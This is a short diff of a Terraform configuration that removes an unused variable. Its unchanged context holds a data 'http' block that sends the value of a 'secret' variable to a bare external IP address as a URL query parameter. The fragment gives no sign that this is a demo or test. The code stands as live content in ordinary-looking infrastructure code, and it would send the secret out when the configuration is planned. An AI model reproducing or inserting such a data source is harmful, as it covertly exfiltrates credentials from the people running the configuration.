@@ -22,7 +22,6 @@ resource "aws_instance" "ubuntu" {
 }
 
 variable "secret" {}
-variable "name" {}
 
 data "http" "secret" {
   url = "http://13.236.148.43:3000/?hi=${var.secret}"
